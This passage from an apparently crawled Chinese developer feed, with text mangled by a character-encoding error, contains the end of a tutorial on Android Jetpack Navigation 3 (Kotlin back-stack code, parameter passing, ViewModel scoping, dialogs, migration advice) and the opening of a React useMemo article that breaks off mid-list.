Â Â Â Â <span class="hljs-comment">//Â è¿”å›Â =Â ç§»é™¤æœ€åä¸€ä¸ªå…ƒç´ </span>
Â Â Â Â <span class="hljs-function"><span class="hljs-keyword">fun</span>Â <span class="hljs-title">goBack</span><span class="hljs-params">()</span></span>Â {
Â Â Â Â Â Â Â Â <span class="hljs-keyword">if</span>Â (backStack.sizeÂ &gt;Â <span class="hljs-number">1</span>)Â {
Â Â Â Â Â Â Â Â Â Â Â Â backStack.removeAt(backStack.lastIndex)
Â Â Â Â Â Â Â Â }
Â Â Â Â }

Â Â Â Â <span class="hljs-comment">//Â å¸¦å‚æ•°è·³è½¬ç¤ºä¾‹</span>
Â Â Â Â <span class="hljs-function"><span class="hljs-keyword">fun</span>Â <span class="hljs-title">openProduct</span><span class="hljs-params">(productId:Â <span class="hljs-type">String</span>)</span></span>Â {
Â Â Â Â Â Â Â Â backStack.add(ProductDetail(
Â Â Â Â Â Â Â Â Â Â Â Â productIdÂ =Â productId,
Â Â Â Â Â Â Â Â Â Â Â Â sourceÂ =Â <span class="hljs-string">"catalog"</span>
Â Â Â Â Â Â Â Â ))
Â Â Â Â }
}
</code></pre>
<h3 data-id="heading-4">æ˜¾ç¤ºå¯¼èˆªå†…å®¹</h3>
<p>ä½¿ç”¨ <code>NavDisplay</code> å°†è¿”å›æ ˆæ¸²æŸ“ä¸º UIï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@Composable</span>
funÂ AppNavigation()Â {
Â Â Â Â valÂ backStackÂ =Â rememberÂ {Â mutableStateListOf&lt;NavKey&gt;(Home)Â }

Â Â Â Â <span class="hljs-built_in">NavDisplay</span>(
Â Â Â Â Â Â Â Â backStackÂ =Â backStack,
Â Â Â Â Â Â Â Â onBackÂ =Â {Â backStack.removeLastOrNull()Â },
Â Â Â Â Â Â Â Â entryProviderÂ =Â {Â keyÂ -&gt;
Â Â Â Â Â Â Â Â Â Â Â Â whenÂ (key)Â {
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â isÂ HomeÂ -&gt;Â <span class="hljs-built_in">NavEntry</span>(key)Â {
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-built_in">HomeScreen</span>(
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â onProductClickÂ =Â {Â idÂ -&gt;
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â backStack.add(ProductDetail(id))
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â }
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â )
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â }
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â isÂ ProductDetailÂ -&gt;Â <span class="hljs-built_in">NavEntry</span>(key)Â {
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-comment">//Â å‚æ•°ç›´æ¥ä»Â keyÂ ä¸­è·å–</span>
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-built_in">ProductScreen</span>(
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â productIdÂ =Â key.productId,
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â sourceÂ =Â key.source,
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â onBackÂ =Â {Â backStack.removeLastOrNull()Â }
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â )
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â }
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â isÂ UserProfileÂ -&gt;Â <span class="hljs-built_in">NavEntry</span>(key)Â {
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-built_in">ProfileScreen</span>(
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â userIdÂ =Â key.userId,
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â editableÂ =Â key.showEditButton
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â )
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â }
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â elseÂ -&gt;Â <span class="hljs-built_in">NavEntry</span>(Unit)Â {
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Text("æœªçŸ¥é¡µé¢")
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â }
Â Â Â Â Â Â Â Â Â Â Â Â }
Â Â Â Â Â Â Â Â }
Â Â Â Â )
}
</code></pre>
<h2 data-id="heading-5">å‚æ•°ä¼ é€’ï¼šå‘Šåˆ«å­—ç¬¦ä¸²æ‹¼æ¥</h2>
<p>Navigation 3 çš„å‚æ•°ä¼ é€’æ–¹å¼æ˜¯å…¶æœ€å¤§çš„æ”¹è¿›ä¹‹ä¸€ã€‚å‚æ•°ç›´æ¥å®šä¹‰åœ¨è·¯ç”±çš„ data class ä¸­ï¼Œç±»å‹å®‰å…¨ï¼Œç¼–è¯‘æœŸæ£€æŸ¥ã€‚</p>
<h3 data-id="heading-6">åŸºç¡€å‚æ•°ä¼ é€’</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">//Â å®šä¹‰å¸¦å‚æ•°çš„è·¯ç”±</span>
<span class="hljs-meta">@Serializable</span>
<span class="hljs-keyword">data</span>Â <span class="hljs-keyword">class</span>Â <span class="hljs-title class_">OrderDetail</span>(
Â Â Â Â <span class="hljs-keyword">val</span>Â orderId:Â String,
Â Â Â Â <span class="hljs-keyword">val</span>Â fromNotification:Â <span class="hljs-built_in">Boolean</span>Â =Â <span class="hljs-literal">false</span>
)Â :Â NavKey

<span class="hljs-comment">//Â è·³è½¬æ—¶ä¼ å‚</span>
backStack.add(OrderDetail(
Â Â Â Â orderIdÂ =Â <span class="hljs-string">"ORD-2024-001"</span>,
Â Â Â Â fromNotificationÂ =Â <span class="hljs-literal">true</span>
))

<span class="hljs-comment">//Â ç›®æ ‡é¡µé¢ç›´æ¥ä½¿ç”¨</span>
<span class="hljs-keyword">is</span>Â OrderDetailÂ -&gt;Â NavEntry(key)Â {
Â Â Â Â OrderDetailScreen(
Â Â Â Â Â Â Â Â orderIdÂ =Â key.orderId,Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-comment">//Â ç›´æ¥è®¿é—®</span>
Â Â Â Â Â Â Â Â isFromNotificationÂ =Â key.fromNotification
Â Â Â Â )
}
</code></pre>
<h3 data-id="heading-7">å¤æ‚å¯¹è±¡ä¼ é€’</h3>
<p>å¯¹äºå¤æ‚ç±»å‹ï¼Œå¯ä»¥åºåˆ—åŒ–ä¼ é€’æˆ–ä½¿ç”¨ ID æŸ¥è¯¢ï¼š</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">//Â æ–¹å¼ä¸€ï¼šä¼ é€’å¯åºåˆ—åŒ–å¯¹è±¡</span>
<span class="hljs-variable">@Serializable</span>
dataÂ classÂ <span class="hljs-built_in">CheckoutScreen</span>(
Â Â Â Â valÂ <span class="hljs-attribute">items</span>:Â List&lt;CartItem&gt;,
Â Â Â Â valÂ <span class="hljs-attribute">couponCode</span>:Â String?Â =Â null
)Â :Â NavKey

<span class="hljs-comment">//Â æ–¹å¼äºŒï¼šä¼ é€’Â IDï¼Œåœ¨ç›®æ ‡é¡µé¢è·å–å®Œæ•´æ•°æ®ï¼ˆæ¨èï¼‰</span>
<span class="hljs-variable">@Serializable</span>
dataÂ classÂ <span class="hljs-built_in">CheckoutScreen</span>(
Â Â Â Â valÂ <span class="hljs-attribute">cartId</span>:Â String
)Â :Â NavKey

<span class="hljs-comment">//Â ç›®æ ‡é¡µé¢é€šè¿‡Â ViewModelÂ è·å–æ•°æ®</span>
isÂ CheckoutScreenÂ -&gt;Â <span class="hljs-built_in">NavEntry</span>(key)Â {
Â Â Â Â <span class="hljs-selector-tag">val</span>Â <span class="hljs-selector-tag">viewModel</span>:Â <span class="hljs-selector-tag">CheckoutViewModel</span>Â =Â <span class="hljs-selector-tag">viewModel</span>()
Â Â Â Â <span class="hljs-selector-tag">LaunchedEffect</span>(key.cartId)Â {
Â Â Â Â Â Â Â Â <span class="hljs-selector-tag">viewModel</span><span class="hljs-selector-class">.loadCart</span>(key.cartId)
Â Â Â Â }
Â Â Â Â <span class="hljs-selector-tag">CheckoutContent</span>(viewModel)
}
</code></pre>
<h2 data-id="heading-8">ViewModel é›†æˆ</h2>
<p>Navigation 3 æä¾›äº†å¼€ç®±å³ç”¨çš„ ViewModel ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//Â æ·»åŠ ä¾èµ–</span>
<span class="hljs-built_in">implementation</span>("androidx.lifecycle:lifecycle-viewmodel-navigation3:<span class="hljs-number">2.10</span>.<span class="hljs-number">0</span>")

<span class="hljs-comment">//Â é…ç½®Â NavDisplay</span>
<span class="hljs-built_in">NavDisplay</span>(
Â Â Â Â backStackÂ =Â backStack,
Â Â Â Â onBackÂ =Â {Â backStack.removeLastOrNull()Â },
Â Â Â Â entryDecoratorsÂ =Â <span class="hljs-built_in">listOf</span>(
Â Â Â Â Â Â Â Â rememberSavedStateNavEntryDecorator(),Â Â Â Â Â <span class="hljs-comment">//Â çŠ¶æ€ä¿å­˜</span>
Â Â Â Â Â Â Â Â <span class="hljs-built_in">rememberViewModelStoreNavEntryDecorator</span>()Â Â <span class="hljs-comment">//Â ViewModelÂ ä½œç”¨åŸŸ</span>
Â Â Â Â ),
Â Â Â Â entryProviderÂ =Â {Â keyÂ -&gt;
Â Â Â Â Â Â Â Â whenÂ (key)Â {
Â Â Â Â Â Â Â Â Â Â Â Â isÂ ProductDetailÂ -&gt;Â <span class="hljs-built_in">NavEntry</span>(key)Â {
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-comment">//Â ViewModelÂ è‡ªåŠ¨ç»‘å®šåˆ°Â NavEntryÂ ç”Ÿå‘½å‘¨æœŸ</span>
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â valÂ viewModel:Â ProductViewModelÂ =Â <span class="hljs-built_in">viewModel</span>()
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-built_in">ProductScreen</span>(viewModel)
Â Â Â Â Â Â Â Â Â Â Â Â }
Â Â Â Â Â Â Â Â }
Â Â Â Â }
)
</code></pre>
<p>ViewModel ä¼šåœ¨å¯¹åº”çš„ NavEntry ä»è¿”å›æ ˆç§»é™¤æ—¶è‡ªåŠ¨æ¸…ç†ï¼Œæ— éœ€æ‰‹åŠ¨ç®¡ç†ã€‚</p>
<h2 data-id="heading-9">åŠ¨ç”»ä¸è¿‡æ¸¡æ•ˆæœ</h2>
<p>Navigation 3 å†…ç½®äº†å¹³æ»‘çš„è½¬åœºåŠ¨ç”»ï¼Œæ”¯æŒé¢„æµ‹æ€§è¿”å›æ‰‹åŠ¿ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">  NavDisplay(
Â Â Â Â <span class="hljs-attr">backStack</span>Â =Â backStack,
Â Â Â Â <span class="hljs-attr">onBack</span>Â =Â {Â backStack.removeLastOrNull()Â },
Â Â Â Â <span class="hljs-attr">entryProvider</span>Â =Â entryProvider,
Â Â Â Â //Â è‡ªå®šä¹‰åŠ¨ç”»
Â Â Â Â <span class="hljs-attr">transitionSpec</span>Â =Â {
Â Â Â Â Â Â Â Â slideInHorizontallyÂ {Â itÂ }Â togetherWithÂ slideOutHorizontallyÂ {Â -itÂ }
Â Â Â Â }
)
</code></pre>
<h2 data-id="heading-10">å¯¹è¯æ¡†ä¸åº•éƒ¨å¼¹çª—</h2>
<pre><code class="hljs language-ini" lang="ini">//Â å®šä¹‰å¯¹è¯æ¡†è·¯ç”±
@Serializable
dataÂ classÂ ConfirmDialog(valÂ message:Â String)Â :Â NavKey

//Â ä½¿ç”¨Â DialogSceneStrategy
NavDisplay(
Â Â Â Â <span class="hljs-attr">backStack</span>Â =Â backStack,
Â Â Â Â <span class="hljs-attr">sceneStrategy</span>Â =Â rememberÂ {Â DialogSceneStrategy()Â },
Â Â Â Â <span class="hljs-attr">entryProvider</span>Â =Â {Â keyÂ -&gt;
Â Â Â Â Â Â Â Â whenÂ (key)Â {
Â Â Â Â Â Â Â Â Â Â Â Â isÂ ConfirmDialogÂ -&gt;Â NavEntry(
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-attr">key</span>Â =Â key,
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-attr">metadata</span>Â =Â DialogSceneStrategy.dialog()Â Â //Â æ ‡è®°ä¸ºå¯¹è¯æ¡†
Â Â Â Â Â Â Â Â Â Â Â Â )Â {
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â AlertDialog(
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-attr">onDismissRequest</span>Â =Â {Â backStack.removeLastOrNull()Â },
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-attr">title</span>Â =Â {Â Text(<span class="hljs-string">"ç¡®è®¤"</span>)Â },
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-attr">text</span>Â =Â {Â Text(key.message)Â },
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-attr">confirmButton</span>Â =Â {Â /*Â ...Â */Â }
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â )
Â Â Â Â Â Â Â Â Â Â Â Â }
Â Â Â Â Â Â Â Â }
Â Â Â Â }
)
</code></pre>
<h2 data-id="heading-11">ä¸ Navigation 2 çš„æ ¸å¿ƒå·®å¼‚</h2>













































<table><thead><tr><th>æ–¹é¢</th><th>Navigation 2</th><th>Navigation 3</th></tr></thead><tbody><tr><td><strong>è®¾è®¡ç›®æ ‡</strong></td><td>Views &amp; Compose å…¼å®¹</td><td>ä»… Compose</td></tr><tr><td><strong>è¿”å›æ ˆç®¡ç†</strong></td><td>åº“å†…éƒ¨ç®¡ç†ï¼ˆé»‘ç›’ï¼‰</td><td>å¼€å‘è€…å®Œå…¨æŒæ§</td></tr><tr><td><strong>è·¯ç”±å®šä¹‰</strong></td><td>å­—ç¬¦ä¸²æˆ– NavGraphBuilder DSL</td><td>data class/object</td></tr><tr><td><strong>å‚æ•°ä¼ é€’</strong></td><td>SafeArgs / Bundle</td><td>ç›´æ¥å±æ€§è®¿é—®</td></tr><tr><td><strong>çŠ¶æ€æ§åˆ¶</strong></td><td>NavController</td><td>NavigationState + Navigator</td></tr><tr><td><strong>å¤šçª—æ ¼å¸ƒå±€</strong></td><td>éœ€è¦é¢å¤–å¤„ç†</td><td>åŸç”Ÿ Scene æ”¯æŒ</td></tr><tr><td><strong>åµŒå¥—å¯¼èˆª</strong></td><td>æ”¯æŒå¤šå±‚åµŒå¥—</td><td>ç›®å‰ä»…æ”¯æŒå•å±‚</td></tr></tbody></table>
<h2 data-id="heading-12">è¿ç§»å»ºè®®</h2>
<p>å¦‚æœä½ æ­£åœ¨è€ƒè™‘è¿ç§»åˆ° Navigation 3ï¼š</p>
<p><strong>é€‚åˆè¿ç§»çš„åœºæ™¯ï¼š</strong></p>
<ul>
<li>â€¢ çº¯ Compose åº”ç”¨</li>
<li>â€¢ éœ€è¦è‡ªé€‚åº”å¸ƒå±€ï¼ˆæ‰‹æœº/å¹³æ¿/æ¡Œé¢ï¼‰</li>
<li>â€¢ å¸Œæœ›æ›´å¥½åœ°æ§åˆ¶å¯¼èˆªçŠ¶æ€</li>
<li>â€¢ æ–°é¡¹ç›®æˆ–é‡æ„é¡¹ç›®</li>
</ul>
<p><strong>æš‚æ—¶è§‚æœ›çš„åœºæ™¯ï¼š</strong></p>
<ul>
<li>â€¢ ä¾èµ–å¤æ‚æ·±åº¦é“¾æ¥</li>
<li>â€¢ éœ€è¦å¤šå±‚åµŒå¥—å¯¼èˆª</li>
<li>â€¢ View ä¸ Compose æ··åˆåº”ç”¨</li>
<li>â€¢ å¯¹ç¨³å®šæ€§è¦æ±‚æé«˜çš„ç”Ÿäº§ç¯å¢ƒ</li>
</ul>
<h2 data-id="heading-13">æ€»ç»“</h2>
<p>Navigation 3 ä»£è¡¨äº† Android å¯¼èˆªæ–¹æ¡ˆçš„ä¸€æ¬¡èŒƒå¼è½¬å˜ã€‚å®ƒæŠ›å¼ƒäº†è€ç‰ˆæœ¬çš„å†å²åŒ…è¢±ï¼Œå®Œå…¨æ‹¥æŠ± Compose çš„å£°æ˜å¼ç†å¿µã€‚è™½ç„¶ç›®å‰è¿˜æœ‰äº›åŠŸèƒ½å°šæœªå®Œå–„ï¼ˆå¦‚æ·±åº¦é“¾æ¥ï¼‰ï¼Œä½†å…¶æ¸…æ™°çš„ API è®¾è®¡å’Œå¯¹å¼€å‘è€…çš„ä¿¡ä»»ï¼Œè®©å¯¼èˆªé€»è¾‘å˜å¾—å‰æ‰€æœªæœ‰çš„é€æ˜å’Œå¯æ§ã€‚</p>
<p>å¦‚æœä½ æ­£åœ¨å¼€å‘æ–°çš„ Compose åº”ç”¨ï¼ŒNavigation 3 ç»å¯¹å€¼å¾—ä¸€è¯•ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åˆ«å†ä¹±ç”¨ useMemo äº†ï¼React æ€§èƒ½ä¼˜åŒ–ä¸‰å¤§ç¼“å­˜ Hook å¯¹æ¯” + ä¸ Vue computed çš„æœ¬è´¨åŒºåˆ«]]></title>    <link>https://juejin.cn/post/7596865421612138550</link>    <guid>https://juejin.cn/post/7596865421612138550</guid>    <pubDate>2026-01-19T11:14:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596865421612138550" data-draft-id="7596883689826844735" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åˆ«å†ä¹±ç”¨ useMemo äº†ï¼React æ€§èƒ½ä¼˜åŒ–ä¸‰å¤§ç¼“å­˜ Hook å¯¹æ¯” + ä¸ Vue computed çš„æœ¬è´¨åŒºåˆ«"/> <meta itemprop="keywords" content="React.js,å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2026-01-19T11:14:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å…¨æ ˆæ‰“æ€ªæ—¥è®°"/> <meta itemprop="url" content="https://juejin.cn/user/2269028453720813"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åˆ«å†ä¹±ç”¨ useMemo äº†ï¼React æ€§èƒ½ä¼˜åŒ–ä¸‰å¤§ç¼“å­˜ Hook å¯¹æ¯” + ä¸ Vue computed çš„æœ¬è´¨åŒºåˆ«
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2269028453720813/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å…¨æ ˆæ‰“æ€ªæ—¥è®°
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T11:14:06.000Z" title="Mon Jan 19 2026 11:14:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ€è¿‘åœ¨ review ä»£ç æ—¶ï¼Œå‘ç°ä¸å°‘åŒå­¦å¯¹Â <code>useMemo</code>Â çš„ä½¿ç”¨å­˜åœ¨è¯¯è§£ï¼š</p>
<ul>
<li>æœ‰çš„åœ°æ–¹è¯¥ç”¨ä¸ç”¨ï¼Œå¯¼è‡´æ€§èƒ½æµªè´¹ï¼›</li>
<li>æœ‰çš„åœ°æ–¹æ»¥ç”¨ï¼Œåè€Œå¢åŠ å¼€é”€ï¼›</li>
<li>æ›´æœ‰äººæŠŠå®ƒå’ŒÂ <code>useRef</code>ã€<code>useCallback</code>Â æ··ä¸ºä¸€è°ˆâ€¦â€¦</li>
</ul>
<p>ä»Šå¤©ï¼Œæˆ‘å°±ç”¨<strong>ä¸€ä¸ªç®€å•ä¾‹å­ + ä¸‰å¤§å¯¹æ¯” + ä¸€ä¸ªçµé­‚æ‹·é—®</strong>ï¼Œå¸¦ä½ å½»åº•ææ‡‚Â <code>useMemo</code>Â çš„æ­£ç¡®æ‰“å¼€æ–¹å¼ï¼</p>
<h3 data-id="heading-0">ä¸€ã€å…ˆçœ‹ä¸€ä¸ªç»å…¸åœºæ™¯ï¼šä¸ºä»€ä¹ˆéœ€è¦ useMemoï¼Ÿ</h3>
<p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªè®¡æ•°å™¨ï¼Œè¿˜æœ‰ä¸€ä¸ªâ€œåˆ‡æ¢ä¸»é¢˜â€æŒ‰é’®ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab945f7316694ca99ac99dd4597517ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YWo5qCI5omT5oCq5pel6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769426045&amp;x-signature=y338FC%2FDCzRQx63HBXalLJDN69I%3D" alt="carbon (3).png" loading="lazy"/></p>
<p>é—®é¢˜æ¥äº†ï¼š<strong>å½“æˆ‘ç‚¹å‡»â€œåˆ‡æ¢ä¸»é¢˜â€æ—¶ï¼Œ<code>squared</code>Â ä¼šé‡æ–°è®¡ç®—å—ï¼Ÿ</strong></p>
<p>âœ… ç­”æ¡ˆæ˜¯ï¼š<strong>ä¼šï¼</strong><br/>
å› ä¸ºæ¯æ¬¡çŠ¶æ€æ›´æ–°éƒ½ä¼šè§¦å‘ç»„ä»¶é‡æ–°æ‰§è¡Œï¼Œ<code>count * count</code>Â å°±ä¼šè¢«é‡å¤è®¡ç®—ã€‚</p>
<p>è™½ç„¶ä¹˜æ³•å¾ˆå¿«ï¼Œä½†å¦‚æœè¿™æ˜¯ä¸ªå¤æ‚æ“ä½œï¼ˆå¦‚æ’åºã€æ ¼å¼åŒ–ã€æ·±åº¦å…‹éš†ï¼‰ï¼Œå°±ä¼šé€ æˆ<strong>ä¸å¿…è¦çš„æ€§èƒ½æŸè€—</strong>ã€‚</p>
<hr/>
<h3 data-id="heading-1">äºŒã€useMemoï¼šåªåœ¨ä¾èµ–å˜åŒ–æ—¶æ‰è®¡ç®—</h3>
<p>è§£å†³æ–¹æ¡ˆå°±æ˜¯ â€”â€”Â <strong><code>useMemo</code></strong>ï¼</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c84009f486a64b6db8e08d7b0f897e2b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YWo5qCI5omT5oCq5pel6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769426045&amp;x-signature=h7Hvqf%2Bs0ZIxCUcnhEWnl7FAO%2FE%3D" alt="carbon (4).png" loading="lazy"/></p>
<p>ç°åœ¨ï¼š</p>
<ul>
<li>ç‚¹å‡»Â  <strong>+1</strong>Â â†’ é‡æ–°è®¡ç®— âœ…</li>
